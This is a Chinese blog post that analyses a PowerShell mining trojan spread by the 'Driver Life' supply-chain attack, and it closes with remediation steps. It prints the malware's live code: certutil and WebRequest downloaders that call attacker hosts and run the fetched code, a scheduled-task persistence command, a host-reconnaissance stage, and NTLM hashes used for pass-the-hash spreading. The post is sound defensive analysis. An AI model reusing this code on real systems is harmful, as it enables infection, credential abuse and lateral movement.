<!doctype html><html class="not-ready lg:text-base" style=--bg:#faf8f1 lang=zh-cn dir=ltr><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>驱动人生供应链木马攻击2019.1.30变种木马分析 - 倾旋的博客</title><meta name=theme-color><meta name=description content='0x00 事件背景
360安全大脑监测到通过"驱动人生"供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。
pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。
0x01 分析研讨
由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。
PS:样本代码过长，遂使用图片截图
0x02 分析过程
解密第一层
病毒样本：

第一个动作，创建一个名为Certificate的任务计划，在七点开始，每隔一小时执行一次以下命令：

cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat>nul&amp;expand -r v.dat>nul&amp;v.bat>nul&amp;del v.dat v.bat>nul)
由于目前cert.beahh.com已经无法访问，所以进行下一个powershell分析环节。
首先，powershell -nop -w hidden -ep bypass -e 后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。
Windows中的powershell执行策略：
PS C:\Users\Rvn0xsy> Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine          Bypass
将后面的base64解密后：

得到如下代码：
while($true)
{
[System.Threading.Thread]::Sleep(200000);
[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
$q = [System.Net.WebRequest]::Create("http://new.beahh.com/startup.php?ver=1&amp;mac="+$m+"&amp;ver="+(Get-WmiObject -Class Win32_OperatingSystem).version+"&amp;bit="+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace "##";
$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
iex $c;
[System.Threading.Thread]::Sleep(1000000);
}
外部是一个循环，将Sleep去除后，可以看到调用了Invoke-Expression，Invoke-Expression是一个能将变量的内容当作powershell表达式执行的函数。'><meta name=author content="倾旋的博客"><link rel="preload stylesheet" as=style href=https://payloads.online/main.min.css><link rel=preload as=image href=https://payloads.online/theme.png><link rel=preload as=image href=/avatar.jpeg><script defer src=https://payloads.online/highlight.min.js onload=hljs.initHighlightingOnLoad()></script><link rel=icon href=https://payloads.online/favicon.ico><link rel=apple-touch-icon href=https://payloads.online/apple-touch-icon.png><meta name=generator content="Hugo 0.148.2"><meta itemprop=name content="驱动人生供应链木马攻击2019.1.30变种木马分析"><meta itemprop=description content="360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新……"><meta itemprop=datePublished content="2019-02-23T00:00:00+00:00"><meta itemprop=dateModified content="2019-02-23T00:00:00+00:00"><meta itemprop=wordCount content="389"><meta itemprop=keywords content="应急响应"><meta property="og:url" content="https://payloads.online/archivers/2019-02-23/1/"><meta property="og:site_name" content="倾旋的博客"><meta property="og:title" content="驱动人生供应链木马攻击2019.1.30变种木马分析"><meta property="og:description" content="360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新……"><meta property="og:locale" content="zh_cn"><meta property="og:type" content="article"><meta property="article:section" content="posts"><meta property="article:published_time" content="2019-02-23T00:00:00+00:00"><meta property="article:modified_time" content="2019-02-23T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="驱动人生供应链木马攻击2019.1.30变种木马分析"><meta name=twitter:description content="360安全大脑监测到通过”驱动人生”供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新……"><link rel=canonical href=https://payloads.online/archivers/2019-02-23/1/></head><body class="bg-(--bg) text-black antialiased duration-200 ease-out [-webkit-tap-highlight-color:transparent] dark:text-white"><header class="mx-auto flex h-[4.5rem] max-w-(--w) px-8 whitespace-nowrap lg:justify-center"><div class="relative z-50 flex items-center ltr:mr-auto rtl:ml-auto"><a class="-translate-y-[1px] text-2xl font-medium" href=https://payloads.online/>倾旋的博客</a><div class="btn-dark text-[0px] ltr:ml-4 rtl:mr-4 h-6 w-6 shrink-0 cursor-pointer [background:url(./theme.png)_left_center/_auto_theme('spacing.6')_no-repeat] [transition:_background-position_0.4s_steps(5)] dark:[background-position:right]" role=button aria-label=Dark></div></div><div class="btn-menu relative z-50 flex h-[4.5rem] w-[5rem] shrink-0 cursor-pointer flex-col items-center justify-center gap-2.5 lg:hidden ltr:-mr-8 rtl:-ml-8" role=button aria-label=Menu></div><script>const htmlClass=document.documentElement.classList;setTimeout(()=>{htmlClass.remove("not-ready")},10);const btnMenu=document.querySelector(".btn-menu");btnMenu.addEventListener("click",()=>{htmlClass.toggle("open")});const metaTheme=document.querySelector('meta[name="theme-color"]'),lightBg="#faf8f1".replace(/"/g,""),setDark=e=>{metaTheme.setAttribute("content",e?"#000":lightBg),htmlClass[e?"add":"remove"]("dark"),localStorage.setItem("dark",e)},darkScheme=window.matchMedia("(prefers-color-scheme: dark)");if(htmlClass.contains("dark"))setDark(!0);else{const e=localStorage.getItem("dark");setDark(e?e==="true":darkScheme.matches)}darkScheme.addEventListener("change",e=>{setDark(e.matches)});const btnDark=document.querySelector(".btn-dark");btnDark.addEventListener("click",()=>{setDark(localStorage.getItem("dark")!=="true")})</script><div class="nav-wrapper fixed inset-x-0 top-full z-40 flex h-full flex-col justify-center bg-(--bg) pb-16 duration-200 select-none lg:static lg:h-auto lg:flex-row lg:bg-transparent! lg:pb-0 lg:transition-none"><nav class="lg:ml-12 lg:flex lg:flex-row lg:items-center lg:space-x-10 rtl:space-x-reverse"><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/>首页</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/posts/>文章列表</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/tags>标签</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/projects>开源项目</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/about>关于我</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/links/>友情链接</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/message>留言</a><a class="block text-center text-xl leading-[5rem] lg:text-base lg:font-normal" href=/sponsor>赞助</a></nav></div></header><main class="prose prose-neutral dark:prose-invert relative mx-auto min-h-[calc(100vh-9rem)] max-w-(--w) px-8 pt-14 pb-16"><article><header class=mb-14><h1 class="my-0! pb-2.5">驱动人生供应链木马攻击2019.1.30变种木马分析</h1><div class="text-xs antialiased opacity-60"><time>Feb 23, 2019</time><span class=mx-1>&#183;</span>
<span>倾旋</span></div></header><section><h2 id=0x00-事件背景>0x00 事件背景</h2><p>360安全大脑监测到通过"驱动人生"供应链攻击传播的挖矿木马在1月30日下午4时左右再次更新。此次更新中，木马在此前抓取系统帐户密码的基础上增加了抓取密码hash值的功能，并试图通过pass the hash攻击进行横向渗透，使得该木马的传播能力进一步加强，即使是有高强度口令的机器也有可能被攻陷。</p><p>pass the hash也称作哈希传递攻击，攻击者可以直接通过密码的哈希值访问远程主机或服务，而不用提供明文密码。攻击者使用pass the hash技术尝试在系统登录密码非弱口令并且无法抓取登录密码的情况下进行横向攻击，增加攻击成功率。</p><h2 id=0x01-分析研讨>0x01 分析研讨</h2><p>由于木马是样本都是不落地的方式，核心技术是通过定时计划任务执行powershell代码达到持续控制的目的，因此最先分析powershell代码，了解它做了哪些动作，指定查杀手段。</p><p>PS:样本代码过长，遂使用图片截图</p><h2 id=0x02-分析过程>0x02 分析过程</h2><h3 id=解密第一层>解密第一层</h3><p>病毒样本：</p><p><img src=https://images.payloads.online/4d16b518-4f5f-11ec-b05e-00d861bf4abb.png alt></p><p>第一个动作，创建一个名为<code>Certificate</code>的任务计划，在七点开始，每隔一小时执行一次以下命令：</p><pre tabindex=0><code>
cmd.exe /c (cd %temp%&amp;certutil -urlcache -split -f http://cert.beahh.com/cert.php?ver1=%COMPUTERNAME% v.dat&gt;nul&amp;expand -r v.dat&gt;nul&amp;v.bat&gt;nul&amp;del v.dat v.bat&gt;nul)
</code></pre><p>由于目前<code>cert.beahh.com</code>已经无法访问，所以进行下一个powershell分析环节。</p><p>首先，<code>powershell -nop -w hidden -ep bypass -e </code>后接着就是base64编码的powershell代码，并且以Bypass作为当前执行策略。</p><p>Windows中的powershell执行策略：</p><pre tabindex=0><code>PS C:\Users\Rvn0xsy&gt; Get-ExecutionPolicy -List

        Scope ExecutionPolicy
        ----- ---------------
MachinePolicy       Undefined
   UserPolicy       Undefined
      Process       Undefined
  CurrentUser       Undefined
 LocalMachine          Bypass
</code></pre><p>将后面的base64解密后：</p><p><img src=https://images.payloads.online/4d5d8218-4f5f-11ec-baeb-00d861bf4abb.png alt></p><p>得到如下代码：</p><pre tabindex=0><code>while($true)
{
[System.Threading.Thread]::Sleep(200000);
[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
iex $c;
[System.Threading.Thread]::Sleep(1000000);
}
</code></pre><p>外部是一个循环，将Sleep去除后，可以看到调用了<code>Invoke-Expression</code>，<code>Invoke-Expression</code>是一个能将变量的内容当作powershell表达式执行的函数。</p><p>而iex只是<code>Invoke-Expression</code>的别名。</p><p>下面简单演示几个例子：</p><pre tabindex=0><code>PS C:\Users\Rvn0xsy&gt; iex &#34;Write-Host Rvn0xsy&#34;
Rvn0xsy
PS C:\Users\Rvn0xsy&gt; Write-Host Rvn0xsy
Rvn0xsy
PS C:\Users\Rvn0xsy&gt; Invoke-Expression &#34;Write-Host Rvn0xsy&#34;
Rvn0xsy
PS C:\Users\Rvn0xsy&gt;
</code></pre><p>将上述的木马脚本中iex替换成Write-Host即可：</p><pre tabindex=0><code>while($true)
{

[string]$m = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)
$q = [System.Net.WebRequest]::Create(&#34;http://new.beahh.com/startup.php?ver=1&amp;mac=&#34;+$m+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture).GetResponse().GetResponseStream();
$r = (new-object System.IO.StreamReader $q).ReadToEnd() -replace &#34;##&#34;;
$c = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($r));
Write-Host $c;
}
</code></pre><p>在这里我们使用Windows 10自带的Windows Powershell ISE脚本调试器来进行后续的分析。</p><p><img src=https://images.payloads.online/4da5b0ce-4f5f-11ec-8b80-00d861bf4abb.png alt></p><h3 id=解密第二层>解密第二层</h3><p>很明显，我们看到有<code>Invoke-Expression</code>，直接将<code>Invoke-Expression</code>改为<code>Write-Host</code>进行调试。</p><p><img src=https://images.payloads.online/4df4fdfa-4f5f-11ec-9352-00d861bf4abb.png alt></p><h3 id=解密第三层>解密第三层</h3><p>现在获得的代码可读性变得非常低了，但是还是有一定规律可循。</p><p>在第83行，有一个大小写混合的<code>Invoke-Expression</code>：</p><p><img src=https://images.payloads.online/4e3585f0-4f5f-11ec-aae2-00d861bf4abb.png alt></p><p>并且<code>Invoke-Expression</code>做左边还有一个管道符，直接将代码改为<code>| Out-File .\tmp.log</code> ，把结果输出到tmp.log文件中。</p><h3 id=解密第四层>解密第四层</h3><p><img src=https://images.payloads.online/4e75dcae-4f5f-11ec-b69a-00d861bf4abb.png alt></p><p>第四次好像混淆的更加厉害来，但是不影响我们的分析，先看首行：</p><pre tabindex=0><code> . ( $EnV:CoMsPec[4,26,25]-JoIN&#39;&#39;)(((&#39;[string]3CHav = U&#39;+&#39;ABUAB[string]....
</code></pre><p>其中它是以<code>. (表达式)(表达式)</code>来执行的，于是我想到了另外一种函数调用的可能：</p><pre tabindex=0><code>PS C:\Users\Rvn0xsy&gt; . Write-Host &#34;Rvn0xsy&#34;
Rvn0xsy
PS C:\Users\Rvn0xsy&gt;
</code></pre><p>这样也能执行，所以我判断<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>就是<code>iex</code>或者<code>Invoke-Expression</code>，我将<code> . ( $EnV:CoMsPec[4,26,25]-JoIN'')</code>改为<code>Write-Host</code>直接执行：</p><p><img src=https://images.payloads.online/4eb87816-4f5f-11ec-a2c3-00d861bf4abb.png alt></p><p>最终获得了未混淆的代码。</p><p>然后，为了验证我的猜想，我把代码进行更改，获得了<code>Iex</code>：</p><p><img src=https://images.payloads.online/4ef7f8c4-4f5f-11ec-8df4-00d861bf4abb.png alt></p><p><code>. ( $EnV:CoMsPec[4,26,25]-JoIN'')</code> = <code>Iex</code></p><h2 id=0x03-行为分析>0x03 行为分析</h2><pre tabindex=0><code>[string]$av = &#34;&#34;[string]$avs = &#34;&#34;[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC)$avs = (Get-WmiObject -Namesp
ace root\SecurityCenter2 -Class AntiVirusProduct).displayNameif($avs.GetType().name.IndexOf(&#39;Object&#39;) -gt -1){for($v = 0; $v -lt $avs.Count; $v++){$av += $avs[$v] + &#34;|&#34;}}else{$av 
= $avs}try{if((Get-Service zhudongfangyu | Sort -Property Status).Status -eq &#34;Running&#34;){$av += &#39;ZDFY&#39;}}catch{}#[System.Threading.Thread]::Sleep((Get-Random -Minimum 10000 -Maximum
 100000))$path = &#34;$env:temp\\ppp.log&#34;[string]$flag = test-path $path$key = &#34;&amp;mac=&#34;+$mac+&#34;&amp;av=&#34;+$av+&#34;&amp;ver=&#34;+(Get-WmiObject -Class Win32_OperatingSystem).version+&#34;&amp;bit=&#34;+(Get-WmiObj
ect Win32_OperatingSystem).OSArchitecture + &#34;&amp;flag2=&#34; + $flag + &#34;&amp;domain=&#34; + (Get-WmiObject win32_computersystem).Domain + &#34;&amp;user=&#34; + $env:USERNAMEtry{$file = &#34;$env:appdata\\Micro
soft\\cred.ps1&#34;$size = (Get-ChildItem $file -recurse | Measure-Object -property length -sum).sum$file2 = &#34;$env:ALLUSERSPROFILE\\Microsoft\\cred.ps1&#34;$size2 = (Get-ChildItem $file2 
-recurse | Measure-Object -property length -sum).sum        if(($size -ne 50731) -and ($size2 -ne 50731)){try{$url = &#39;http://172.104.177.202/new.dat?xl&#39; + $key(New-Object System.N
et.WebClient).DownloadFile($url,&#34;$file&#34;)}catch{}&amp;cmd.exe /c schtasks /create /sc MINUTE /mo 60 /st 07:00:00 /tn Credentials /tr &#34;powershell -nop -w hidden -ep bypass -f %appdata%\
Microsoft\cred.ps1&#34; /F}}catch{}[System.Threading.Thread]::Sleep(3000)Stop-Process -Force -processname powershell
</code></pre><p>大致意思就是收集本机的操作系统版本、用户名、MAC地址、杀毒软件写入当前环境变量的<code>temp\ppp.log</code>中。</p><p>一般是<code>C:\Users\&lt;USERNAME>\AppData\Local\Temp\ppp.log</code></p><p>然后下载新的powershell文件，到<code>C:\Users\&lt;USERNAME>\AppData\Roaming\Microsoft\cred.ps1</code>中。</p><p>下载的URL是：http://172.104.177.202/new.dat?xl</p><p><img src=https://images.payloads.online/4f43cf74-4f5f-11ec-b265-00d861bf4abb.png alt></p><p>目前ti上未打标签。</p><p>再次经过N层解密后，得到如下代码：</p><p><img src=https://images.payloads.online/4f83bf76-4f5f-11ec-93f1-00d861bf4abb.png alt></p><p>大约6000多行</p><p><img src=https://images.payloads.online/4fcaba3e-4f5f-11ec-934a-00d861bf4abb.png alt></p><p>脚本的功能：</p><p>1.获得当前用户Hash，读取注册表</p><p>2.获得当前系统版本、MAC地址、当前系统所有用户、反病毒软件，尤其是360 Zhudongfangyu服务</p><p>3.端口扫描，全量1-65535、445、139都会扫描</p><p>4.依赖于445 SMB服务进行传播</p><p>其中，常用的Hash和用户名：</p><pre tabindex=0><code>[string[]]$global:alluser = @(&#34;administrator&#34;,&#34;admin&#34;)[string[]]$global:allpass = @(&#34;32ed87bdb5fdc5e9cba88547376818d4&#34;,&#34;8846f7eaee8fb117ad06bdd830b7586c&#34;,&#34;7b592e4f8178b4c75788531b2e747687&#34;,&#34;3fa45a060bd2693ae4c05b601d05ca0c&#34;,&#34;69943c5e63b4d2c104dbbcc15138b72b&#34;,&#34;588feb889288fb953b5f094d47d1565c&#34;,&#34;3dbde697d71690a769204beb12283678&#34;,&#34;df54de3f3438343202c1dd523d0265be&#34;,&#34;7ce21f17c0aee7fb9ceba532d0546ad6&#34;,&#34;2d7f1a5a61d3a96fb5159b5eef17adc6&#34;,&#34;6103d9d963c57275dd3533674708e7be&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;af27efb60c7b238910efe2a7e0676a39&#34;,&#34;259745cb123a52aa2e693aaacca2db52&#34;,&#34;4057b60b514c5402dde3d29a1845c366&#34;,&#34;e8cd0e4a9e89eab931dc5338fcbec54a&#34;,&#34;f1351ac828428d74f6da2968089fc91f&#34;,&#34;b5fe2db507cc5ac540493d48fbd5fe33&#34;,&#34;12bdea0a1cb9486c067deaa851ac1609&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;b23a90d0aad9da3615fafc27a1b8baeb&#34;,&#34;a333f09e72c683f0205049d0db8b81fb&#34;,&#34;ad70819c5bc807280974d80f45982011&#34;,&#34;2d20d252a479f485cdf5e171d93985bf&#34;,&#34;0b6549421b2e7333e0e281f3ba5eea94&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;a80c9cc3f8439ada25af064a874efe2d&#34;,&#34;22315d6ed1a7d5f8a7c98c40e9fa2dec&#34;,&#34;b963c57010f218edc2cc3c229b5e4d0f&#34;,&#34;96880159e785de5314803b1169768900&#34;,&#34;8ec60adea316d957d1cf532c5841758d&#34;,&#34;c22b315c040ae6e0efee3518d830362b&#34;,&#34;7a21990fcd3d759941e45c490f143d5f&#34;,&#34;328727b81ca05805a68ef26acb252039&#34;,&#34;31c72c210ecc03d1eae94fa496069448&#34;,&#34;209c6174da490caeb422f3fa5a7ae634&#34;,&#34;674e48b68c5cd0efd8f7e5faa87b3d1e&#34;,&#34;31fc0dc8f7dfad0e8bd7ccc3842f2ce9&#34;,&#34;579110c49145015c47ecd267657d3174&#34;,&#34;f2477a144dff4f216ab81f2ac3e3207d&#34;,&#34;62b26c13b70e7d5a9724710a41e63688&#34;,&#34;5835048ce94ad0564e29a924a03510ef&#34;,&#34;7773c08920232397cae081704964b786&#34;,&#34;a4141712f19e9dd5adf16919bb38a95c&#34;,&#34;b3ec3e03e2a202cbd54fd104b8504fef&#34;,&#34;f9e37e83b83c47a93c2f09f66408631b&#34;,&#34;162e829be112225fedf856e38e1c65fe&#34;,&#34;f67f5e3f66efd7298be6acd32eeeb27c&#34;)
</code></pre><p>SMB服务传播代码：</p><p><img src=https://images.payloads.online/5006062a-4f5f-11ec-a903-00d861bf4abb.png alt></p><p>会上传启动项：<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code></p><p>这个run.bat就是我拿到的种子了。</p><p>该木马涵盖了Windows SMB客户端的所有代码，以及哈希传递技术的所有功能。</p><p>代码有很多都是采用了Invoke-SMBClient。</p><p>优先感染子网：</p><pre tabindex=0><code>10.
172.
192.168.
</code></pre><p><img src=https://images.payloads.online/5046ffe0-4f5f-11ec-8229-00d861bf4abb.png alt></p><p>其中在开始横向传播之前，它还会下载一个powershell代码：</p><p><img src=https://images.payloads.online/50afcbc4-4f5f-11ec-9c8c-00d861bf4abb.png alt></p><p>但是目前这个域名已经无法访问，无法继续进行跟进。</p><p><code>http://p.beahh.com/upgrade.php?ver=1&amp;mac=</code></p><p>其中在<code>$bytebase64</code>中发现了<code>run.bat</code>的代码：</p><p><img src=https://images.payloads.online/50ef6b44-4f5f-11ec-a7ce-00d861bf4abb.png alt></p><h2 id=0x04-预警与排查方案>0x04 预警与排查方案</h2><ul><li>1.开启Windows防火墙、关闭445端口。</li><li>2.防火墙禁止向<code>172.104.177.202</code>建立连接。</li><li>3.防火墙禁止与<code>*.beahh.com</code>域名的解析。</li><li>4.更改操作系统账号密码。</li><li>5.删除<code>Certificate</code>任务计划。</li><li>6.删除<code>Credentials</code>任务计划。</li><li>7.删除启动项<code>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\run.bat</code>。</li><li>8.删除<code>%appdata%\Microsoft\cred.ps1</code>。</li></ul><p>最主要就是禁止与<code>172.104.177.202</code>进行通信。</p><p>下载器样本：https://payloads.online/scripts/2019-02-23-downloader.txt</p><p>木马本体（解密后）：https://payloads.online/scripts/2019-02-23-res.txt</p></section><nav class="mt-24 flex overflow-hidden rounded-xl bg-black/[3%] text-lg leading-[1.2]! *:flex *:w-1/2 *:items-center *:p-5 *:font-medium *:no-underline dark:bg-white/[8%] [&>*:hover]:bg-black/[2%] dark:[&>*:hover]:bg-white/[3%]"><a class="ltr:pr-3 rtl:pl-3" href=https://payloads.online/archivers/2019-03-14/1/><span class="ltr:mr-1.5 rtl:ml-1.5">←</span><span>MemoryModule-实现原理</span></a><a class="justify-end pl-3 ltr:ml-auto rtl:mr-auto" href=https://payloads.online/archivers/2019-01-31/1/><span>BMP位图隐写</span><span class="ltr:ml-1.5 rtl:mr-1.5">→</span></a></nav><div class="giscus mt-24"></div><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=1 data-reactions-enabled=0 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></article></main><footer class="mx-auto flex h-[4.5rem] max-w-(--w) items-center px-8 text-xs tracking-wider uppercase opacity-60"><div class=mr-auto>倾旋 All rights reserved</div><a class="link mx-6" href=https://gohugo.io/ rel=noopener target=_blank>powered by hugo️️</a>️</footer></body></html>